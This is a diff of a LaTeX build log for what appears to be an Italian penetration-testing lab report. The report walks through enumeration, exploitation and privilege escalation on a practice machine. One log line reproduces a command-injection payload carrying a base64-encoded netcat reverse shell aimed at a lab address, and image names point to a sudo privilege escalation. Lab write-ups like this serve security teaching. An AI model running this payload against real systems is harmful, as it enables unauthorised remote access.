@@ -1,4 +1,4 @@
-This is pdfTeX, Version 3.141592653-2.6-1.40.29 (TeX Live 2026) (preloaded format=pdflatex 2026.6.11)  13 JUN 2026 12:47
+This is pdfTeX, Version 3.141592653-2.6-1.40.29 (TeX Live 2026) (preloaded format=pdflatex 2026.6.11)  15 JUN 2026 00:26
 entering extended mode
  \write18 enabled.
  %&-line parsing enabled.
@@ -960,8 +960,8 @@ Package svg Info: Last page of `./svg-inkscape/logoUnisa(1)_svg-tex.pdf' is 1 o
 n input line 56.
 
 (./svg-inkscape/logoUnisa(1)_svg-tex.pdf_tex
-<./svg-inkscape/logoUnisa(1)_svg-tex.pdf, id=76, page=1, 210.78682pt x 85.82062
-pt>
+<./svg-inkscape/logoUnisa(1)_svg-tex.pdf, id=103, page=1, 210.78682pt x 85.8206
+2pt>
 File: ./svg-inkscape/logoUnisa(1)_svg-tex.pdf Graphic file (type pdf)
 <use ./svg-inkscape/logoUnisa(1)_svg-tex.pdf, page 1>
 Package pdftex.def Info: ./svg-inkscape/logoUnisa(1)_svg-tex.pdf , page1 used o
@@ -1016,7 +1016,7 @@ as been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
 l.141 	\chapter
-               {Phases FGPT}]
+               {Fasi FGPT}]
 Capitolo 2.
 LaTeX Font Info:    Font shape `T1/cmtt/bx/n' in size <10.95> not available
 (Font)              Font shape `T1/cmtt/m/n' tried instead on input line 151.
@@ -1030,7 +1030,7 @@ il gate-way del-l'in-fras-trut-tura vir-tuale (\T1/cmtt/m/n/10.95 192.168.238.2
 [5
 
 ]
-<assets/academy_photo/targetDiscovery/netdiscover.jpeg, id=149, 671.50874pt x 1
+<assets/academy_photo/targetDiscovery/netdiscover.jpeg, id=184, 671.50874pt x 1
 96.735pt>
 File: assets/academy_photo/targetDiscovery/netdiscover.jpeg Graphic file (type 
 jpg)
@@ -1043,9 +1043,9 @@ pdfTeX warning (ext4): destination with the same identifier (name{figure.2.1})
 has been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
-l.238 
-       <./assets/academy_photo/targetDiscovery/netdiscover.jpeg>]
-<assets/academy_photo/targetEnumeration/passive_fingerprint_curl.png, id=156, 4
+l.238 	
+        <./assets/academy_photo/targetDiscovery/netdiscover.jpeg>]
+<assets/academy_photo/targetEnumeration/passive_fingerprint_curl.png, id=191, 4
 38.13687pt x 106.14656pt>
 File: assets/academy_photo/targetEnumeration/passive_fingerprint_curl.png Graph
 ic file (type png)
@@ -1058,9 +1058,9 @@ pdfTeX warning (ext4): destination with the same identifier (name{figure.2.2})
 has been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
-l.261 
-      ]
-<assets/academy_photo/targetEnumeration/passive_fingerprint_two.png, id=166, 79
+l.261 	
+       ]
+<assets/academy_photo/targetEnumeration/passive_fingerprint_two.png, id=202, 79
 6.47563pt x 344.78813pt>
 File: assets/academy_photo/targetEnumeration/passive_fingerprint_two.png Graphi
 c file (type png)
@@ -1068,7 +1068,7 @@ c file (type png)
 Package pdftex.def Info: assets/academy_photo/targetEnumeration/passive_fingerp
 rint_two.png  used on input line 266.
 (pdftex.def)             Requested size: 425.41444pt x 184.1573pt.
-<assets/academy_photo/targetEnumeration/os_fingerprint_nmap.jpeg, id=167, 1008.
+<assets/academy_photo/targetEnumeration/os_fingerprint_nmap.jpeg, id=203, 1008.
 76875pt x 290.08376pt>
 File: assets/academy_photo/targetEnumeration/os_fingerprint_nmap.jpeg Graphic f
 ile (type jpg)
@@ -1081,16 +1081,16 @@ pdfTeX warning (ext4): destination with the same identifier (name{figure.2.3})
 has been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
-l.282 
-      
+l.282 	
+       
 pdfTeX warning (ext4): destination with the same identifier (name{figure.2.4}) 
 has been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
-l.282 
-       <./assets/academy_photo/targetEnumeration/passive_fingerprint_curl.png> 
-<./assets/academy_photo/targetEnumeration/passive_fingerprint_two.png>]
-<assets/academy_photo/targetEnumeration/port_scanning_nmap.jpeg, id=177, 776.90
+l.282 	
+        <./assets/academy_photo/targetEnumeration/passive_fingerprint_curl.png>
+ <./assets/academy_photo/targetEnumeration/passive_fingerprint_two.png>]
+<assets/academy_photo/targetEnumeration/port_scanning_nmap.jpeg, id=213, 776.90
 25pt x 211.79124pt>
 File: assets/academy_photo/targetEnumeration/port_scanning_nmap.jpeg Graphic fi
 le (type jpg)
@@ -1098,8 +1098,8 @@ le (type jpg)
 Package pdftex.def Info: assets/academy_photo/targetEnumeration/port_scanning_n
 map.jpeg  used on input line 298.
 (pdftex.def)             Requested size: 350.33727pt x 95.50554pt.
-<assets/academy_photo/targetEnumeration/directory_scanning_gobuster.jpeg, id=17
-8, 603.75563pt x 465.99094pt>
+<assets/academy_photo/targetEnumeration/directory_scanning_gobuster.jpeg, id=21
+4, 603.75563pt x 465.99094pt>
 File: assets/academy_photo/targetEnumeration/directory_scanning_gobuster.jpeg G
 raphic file (type jpg)
 <use assets/academy_photo/targetEnumeration/directory_scanning_gobuster.jpeg>
@@ -1112,16 +1112,16 @@ pdfTeX warning (ext4): destination with the same identifier (name{figure.2.5})
 has been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
-l.315 
-      
+l.315 	
+       
 pdfTeX warning (ext4): destination with the same identifier (name{figure.2.6}) 
 has been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
-l.315 
-       <./assets/academy_photo/targetEnumeration/os_fingerprint_nmap.jpeg> <./a
-ssets/academy_photo/targetEnumeration/port_scanning_nmap.jpeg>]
-<assets/academy_photo/targetEnumeration/directory_scanning_pro.jpeg, id=185, 59
+l.315 	
+        <./assets/academy_photo/targetEnumeration/os_fingerprint_nmap.jpeg> <./
+assets/academy_photo/targetEnumeration/port_scanning_nmap.jpeg>]
+<assets/academy_photo/targetEnumeration/directory_scanning_pro.jpeg, id=221, 59
 4.72188pt x 404.26031pt>
 File: assets/academy_photo/targetEnumeration/directory_scanning_pro.jpeg Graphi
 c file (type jpg)
@@ -1134,16 +1134,16 @@ pdfTeX warning (ext4): destination with the same identifier (name{figure.2.7})
 has been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
-l.331 
-      
+l.331 	
+       
 pdfTeX warning (ext4): destination with the same identifier (name{figure.2.8}) 
 has been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
-l.331 
-       <./assets/academy_photo/targetEnumeration/directory_scanning_gobuster.jp
-eg> <./assets/academy_photo/targetEnumeration/directory_scanning_pro.jpeg>]
-<assets/academy_photo/targetEnumeration/dirscan_dirbuster.jpeg, id=192, 1260.71
+l.331 	
+        <./assets/academy_photo/targetEnumeration/directory_scanning_gobuster.j
+peg> <./assets/academy_photo/targetEnumeration/directory_scanning_pro.jpeg>]
+<assets/academy_photo/targetEnumeration/dirscan_dirbuster.jpeg, id=228, 1260.71
 pt x 583.17876pt>
 File: assets/academy_photo/targetEnumeration/dirscan_dirbuster.jpeg Graphic fil
 e (type jpg)
@@ -1151,27 +1151,312 @@ e (type jpg)
 Package pdftex.def Info: assets/academy_photo/targetEnumeration/dirscan_dirbust
 er.jpeg  used on input line 334.
 (pdftex.def)             Requested size: 400.38872pt x 185.20613pt.
+LaTeX Font Info:    Font shape `T1/cmtt/bx/n' in size <12> not available
+(Font)              Font shape `T1/cmtt/m/n' tried instead on input line 365.
 
 [11
 pdfTeX warning (ext4): destination with the same identifier (name{figure.2.9}) 
 has been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
-l.374 	\chapter
-               {Final Consideration}
+l.367 	
+       
 pdfTeX warning (ext4): destination with the same identifier (name{figure.2.10})
  has been already used, duplicate ignored
 <argument> ...shipout:D \box_use:N \l_shipout_box 
                                                   \__shipout_drop_firstpage_...
-l.374 	\chapter
-               {Final Consideration} <./assets/academy_photo/targetEnumeration/
-dirscan_dirbuster.jpeg>] [12]
-Capitolo 3.
-[13
+l.367 	
+        <./assets/academy_photo/targetEnumeration/dirscan_dirbuster.jpeg>]
+<assets/academy_photo/vulnerabilityAssessment/admin.png, id=235, 540.51938pt x 
+542.025pt>
+File: assets/academy_photo/vulnerabilityAssessment/admin.png Graphic file (type
+ png)
+<use assets/academy_photo/vulnerabilityAssessment/admin.png>
+Package pdftex.def Info: assets/academy_photo/vulnerabilityAssessment/admin.png
+  used on input line 373.
+(pdftex.def)             Requested size: 240.23016pt x 240.89848pt.
+<assets/academy_photo/vulnerabilityAssessment/admin_code.png, id=236, 560.0925p
+t x 268.75406pt>
+File: assets/academy_photo/vulnerabilityAssessment/admin_code.png Graphic file 
+(type png)
+<use assets/academy_photo/vulnerabilityAssessment/admin_code.png>
+Package pdftex.def Info: assets/academy_photo/vulnerabilityAssessment/admin_cod
+e.png  used on input line 380.
+(pdftex.def)             Requested size: 240.23016pt x 115.27083pt.
+<assets/academy_photo/vulnerabilityAssessment/admin_steganography_cut.png, id=2
+37, 459.21562pt x 145.29282pt>
+File: assets/academy_photo/vulnerabilityAssessment/admin_steganography_cut.png 
+Graphic file (type png)
+<use assets/academy_photo/vulnerabilityAssessment/admin_steganography_cut.png>
+Package pdftex.def Info: assets/academy_photo/vulnerabilityAssessment/admin_ste
+ganography_cut.png  used on input line 392.
+(pdftex.def)             Requested size: 350.33727pt x 110.84933pt.
 
-]
-Capitolo 4.
-[14
+[12
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.11})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.401 	
+       
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.12})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.401 	
+       
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.13})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.401 	
+        <./assets/academy_photo/vulnerabilityAssessment/admin.png> <./assets/ac
+ademy_photo/vulnerabilityAssessment/admin_code.png> <./assets/academy_photo/vul
+nerabilityAssessment/admin_steganography_cut.png>]
+Underfull \hbox (badness 10000) in paragraph at lines 414--415
+[]|\T1/cmr/m/n/10.95 Il ban-ner HTTP espone la dic-i-tu-ra
+ []
+
+<assets/academy_photo/vulnerabilityAssessment/index_php_fake_ping.png, id=249, 
+653.44125pt x 426.09187pt>
+File: assets/academy_photo/vulnerabilityAssessment/index_php_fake_ping.png Grap
+hic file (type png)
+<use assets/academy_photo/vulnerabilityAssessment/index_php_fake_ping.png>
+Package pdftex.def Info: assets/academy_photo/vulnerabilityAssessment/index_php
+_fake_ping.png  used on input line 430.
+(pdftex.def)             Requested size: 400.38872pt x 261.07944pt.
+[13
+pdfTeX warning (ext4): destination with the same identifier (name{table.2.1}) h
+as been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.432 	
+       ]
+<assets/academy_photo/vulnerabilityAssessment/superadmin_first_try.png, id=255,
+ 656.4525pt x 538.26094pt>
+File: assets/academy_photo/vulnerabilityAssessment/superadmin_first_try.png Gra
+phic file (type png)
+<use assets/academy_photo/vulnerabilityAssessment/superadmin_first_try.png>
+Package pdftex.def Info: assets/academy_photo/vulnerabilityAssessment/superadmi
+n_first_try.png  used on input line 441.
+(pdftex.def)             Requested size: 240.23016pt x 196.97693pt.
+<assets/academy_photo/vulnerabilityAssessment/superadmin_second_try.png, id=256
+, 658.71094pt x 545.03625pt>
+File: assets/academy_photo/vulnerabilityAssessment/superadmin_second_try.png Gr
+aphic file (type png)
+<use assets/academy_photo/vulnerabilityAssessment/superadmin_second_try.png>
+Package pdftex.def Info: assets/academy_photo/vulnerabilityAssessment/superadmi
+n_second_try.png  used on input line 447.
+(pdftex.def)             Requested size: 240.23016pt x 198.7744pt.
+ [14
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.14})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.455 \section
+              {Target Exploitation}
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.15})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.455 \section
+              {Target Exploitation} <./assets/academy_photo/vulnerabilityAssess
+ment/index_php_fake_ping.png> <./assets/academy_photo/vulnerabilityAssessment/s
+uperadmin_first_try.png> <./assets/academy_photo/vulnerabilityAssessment/supera
+dmin_second_try.png>] [15]
+<assets/academy_photo/vulnerabilityAssessment/superadmin_php_inspection.png, id
+=270, 665.48625pt x 466.74374pt>
+File: assets/academy_photo/vulnerabilityAssessment/superadmin_php_inspection.pn
+g Graphic file (type png)
+<use assets/academy_photo/vulnerabilityAssessment/superadmin_php_inspection.png
+>
+Package pdftex.def Info: assets/academy_photo/vulnerabilityAssessment/superadmi
+n_php_inspection.png  used on input line 509.
+(pdftex.def)             Requested size: 425.41444pt x 298.37312pt.
+ [16]
+<assets/academy_photo/exploitation/netcat_base64.png, id=275, 420.82219pt x 65.
+49469pt>
+File: assets/academy_photo/exploitation/netcat_base64.png Graphic file (type pn
+g)
+<use assets/academy_photo/exploitation/netcat_base64.png>
+Package pdftex.def Info: assets/academy_photo/exploitation/netcat_base64.png  u
+sed on input line 525.
+(pdftex.def)             Requested size: 425.41444pt x 66.21005pt.
+ [17
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.16})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.529 
+       <./assets/academy_photo/vulnerabilityAssessment/superadmin_php_inspectio
+n.png>]
+<assets/academy_photo/exploitation/netcat_kali_before_conn.png, id=284, 271.012
+5pt x 47.42719pt>
+File: assets/academy_photo/exploitation/netcat_kali_before_conn.png Graphic fil
+e (type png)
+<use assets/academy_photo/exploitation/netcat_kali_before_conn.png>
+Package pdftex.def Info: assets/academy_photo/exploitation/netcat_kali_before_c
+onn.png  used on input line 534.
+(pdftex.def)             Requested size: 425.41444pt x 74.4507pt.
+
+Overfull \hbox (300.3524pt too wide) in paragraph at lines 542--543
+[]\T1/cmtt/m/n/10.95 192.168.238.4 | `echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F
+0IC90bXAvZnx8L2Jpbi9zaCAtaSAyPiYxfHxuYyAxOTIuMTY4LjIzOC40IDIyMjIgPi90bXAvZg=="
+ []
+
+<assets/academy_photo/exploitation/netcat_to_noname.png, id=285, 414.04688pt x 
+69.25874pt>
+File: assets/academy_photo/exploitation/netcat_to_noname.png Graphic file (type
+ png)
+<use assets/academy_photo/exploitation/netcat_to_noname.png>
+Package pdftex.def Info: assets/academy_photo/exploitation/netcat_to_noname.png
+  used on input line 550.
+(pdftex.def)             Requested size: 425.41444pt x 71.16185pt.
+<assets/academy_photo/exploitation/exploit_part_one_spawn_shell.png, id=286, 39
+9.74344pt x 48.18pt>
+File: assets/academy_photo/exploitation/exploit_part_one_spawn_shell.png Graphi
+c file (type png)
+<use assets/academy_photo/exploitation/exploit_part_one_spawn_shell.png>
+Package pdftex.def Info: assets/academy_photo/exploitation/exploit_part_one_spa
+wn_shell.png  used on input line 561.
+(pdftex.def)             Requested size: 425.41444pt x 51.27637pt.
+[18
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.17})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.565 
+      
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.18})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.565 
+      
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.19})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.565 
+       <./assets/academy_photo/exploitation/netcat_base64.png> <./assets/academ
+y_photo/exploitation/netcat_kali_before_conn.png> <./assets/academy_photo/explo
+itation/netcat_to_noname.png>]
+<assets/academy_photo/exploitation/exploit_part_one_flag1.png, id=298, 459.2156
+2pt x 176.15813pt>
+File: assets/academy_photo/exploitation/exploit_part_one_flag1.png Graphic file
+ (type png)
+<use assets/academy_photo/exploitation/exploit_part_one_flag1.png>
+Package pdftex.def Info: assets/academy_photo/exploitation/exploit_part_one_fla
+g1.png  used on input line 570.
+(pdftex.def)             Requested size: 425.41444pt x 163.19905pt.
+
+Overfull \hbox (0.4242pt too wide) in paragraph at lines 578--579
+\T1/cmr/m/n/10.95 (\T1/cmtt/m/n/10.95 flag1.txt\T1/cmr/m/n/10.95 ) con-te-nente
+ un in-dizio cru-ciale per il reper-i-men-to delle cre-den-ziali del-l'u-tente 
+\T1/cmtt/m/n/10.95 haclabs\T1/cmr/m/n/10.95 . Seguen-
+ []
+
+<assets/academy_photo/exploitation/exploit_part_one_haclab_psw.png, id=299, 459
+.21562pt x 129.48375pt>
+File: assets/academy_photo/exploitation/exploit_part_one_haclab_psw.png Graphic
+ file (type png)
+<use assets/academy_photo/exploitation/exploit_part_one_haclab_psw.png>
+Package pdftex.def Info: assets/academy_photo/exploitation/exploit_part_one_hac
+lab_psw.png  used on input line 582.
+(pdftex.def)             Requested size: 500.484pt x 141.12656pt.
+[19
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.20})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.586 
+      
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.21})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.586 
+       <./assets/academy_photo/exploitation/exploit_part_one_spawn_shell.png> <
+./assets/academy_photo/exploitation/exploit_part_one_flag1.png>]
+<assets/academy_photo/exploitation/exploit_part_two_tohaclabs.png, id=308, 459.
+21562pt x 276.28218pt>
+File: assets/academy_photo/exploitation/exploit_part_two_tohaclabs.png Graphic 
+file (type png)
+<use assets/academy_photo/exploitation/exploit_part_two_tohaclabs.png>
+Package pdftex.def Info: assets/academy_photo/exploitation/exploit_part_two_toh
+aclabs.png  used on input line 591.
+(pdftex.def)             Requested size: 475.45825pt x 286.07039pt.
+<assets/academy_photo/privilegeEscalation/sudo_find.png, id=309, 615.80063pt x 
+98.61844pt>
+File: assets/academy_photo/privilegeEscalation/sudo_find.png Graphic file (type
+ png)
+<use assets/academy_photo/privilegeEscalation/sudo_find.png>
+Package pdftex.def Info: assets/academy_photo/privilegeEscalation/sudo_find.png
+  used on input line 603.
+(pdftex.def)             Requested size: 475.45825pt x 76.14407pt.
+ [20
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.22})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.606 \end{figure}
+                  
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.23})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.606 \end{figure}
+                   <./assets/academy_photo/exploitation/exploit_part_one_haclab
+_psw.png> <./assets/academy_photo/exploitation/exploit_part_two_tohaclabs.png>]
+<assets/academy_photo/privilegeEscalation/root_escalation.png, id=318, 615.8006
+3pt x 36.135pt>
+File: assets/academy_photo/privilegeEscalation/root_escalation.png Graphic file
+ (type png)
+<use assets/academy_photo/privilegeEscalation/root_escalation.png>
+Package pdftex.def Info: assets/academy_photo/privilegeEscalation/root_escalati
+on.png  used on input line 618.
+(pdftex.def)             Requested size: 475.45825pt x 27.9001pt.
+<assets/academy_photo/privilegeEscalation/flag3.png, id=319, 615.80063pt x 179.
+92218pt>
+File: assets/academy_photo/privilegeEscalation/flag3.png Graphic file (type png
+)
+<use assets/academy_photo/privilegeEscalation/flag3.png>
+Package pdftex.def Info: assets/academy_photo/privilegeEscalation/flag3.png  us
+ed on input line 627.
+(pdftex.def)             Requested size: 475.45825pt x 138.91936pt.
+[21
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.24})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.634 	
+       
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.25})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.634 	
+       
+pdfTeX warning (ext4): destination with the same identifier (name{figure.2.26})
+ has been already used, duplicate ignored
+<argument> ...shipout:D \box_use:N \l_shipout_box 
+                                                  \__shipout_drop_firstpage_...
+l.634 	
+        <./assets/academy_photo/privilegeEscalation/sudo_find.png> <./assets/ac
+ademy_photo/privilegeEscalation/root_escalation.png> <./assets/academy_photo/pr
+ivilegeEscalation/flag3.png>] [22]
+Capitolo 3.
+
+Overfull \hbox (26.13312pt too wide) in paragraph at lines 661--662
+[]\T1/cmr/bx/n/10.95 Hardening del Web Serv-er: \T1/cmr/m/n/10.95 Im-ple-mentar
+e le in-tes-tazioni HTTP di si-curez-za man-can-ti (\T1/cmtt/m/n/10.95 X-Frame-
+Options\T1/cmr/m/n/10.95 ,
+ []
+
+[23
+
+] [24
+
 
 ] 
 enddocument/afterlastpage (AED): lastpage setting LastPage.
@@ -1181,13 +1466,13 @@ LaTeX2e <2025-11-01>
 L3 programming layer <2026-03-20>
  ***********
 Package rerunfilecheck Info: File `MetodologiePT.out' has not changed.
-(rerunfilecheck)             Checksum: 99EB6052E45926C84B1065588F6D2870;2903.
+(rerunfilecheck)             Checksum: 6F7ECDBF1421BCC97E64A08DDD5FD81E;5222.
  ) 
 Here is how much of TeX's memory you used:
- 27392 strings out of 469296
- 525577 string characters out of 5465561
- 966911 words of memory out of 6000000
- 55682 multiletter control sequences out of 15000+600000
+ 27603 strings out of 469296
+ 535158 string characters out of 5465561
+ 968832 words of memory out of 6000000
+ 55848 multiletter control sequences out of 15000+600000
  645061 words of font info for 77 fonts, out of 8000000 for 9000
  36 hyphenation exceptions out of 8191
  94i,12n,108p,1121b,820s stack positions out of 10000i,1000n,20000p,200000b,200000s
@@ -1206,10 +1491,10 @@ fb></usr/share/texlive/texmf-dist/fonts/type1/public/cm-super/sfti1440.pfb></us
 r/share/texlive/texmf-dist/fonts/type1/public/cm-super/sftt0900.pfb></usr/share
 /texlive/texmf-dist/fonts/type1/public/cm-super/sftt1095.pfb></usr/share/texliv
 e/texmf-dist/fonts/type1/public/cm-super/sftt1200.pfb>
-Output written on MetodologiePT.pdf (15 pages, 1042186 bytes).
+Output written on MetodologiePT.pdf (25 pages, 1785205 bytes).
 PDF statistics:
- 297 PDF objects out of 1000 (max. 8388607)
- 228 compressed objects within 3 object streams
- 45 named destinations out of 1000 (max. 500000)
- 199 words of extra memory for PDF output out of 10000 (max. 10000000)
+ 452 PDF objects out of 1000 (max. 8388607)
+ 338 compressed objects within 4 object streams
+ 90 named destinations out of 1000 (max. 500000)
+ 340 words of extra memory for PDF output out of 10000 (max. 10000000)
 
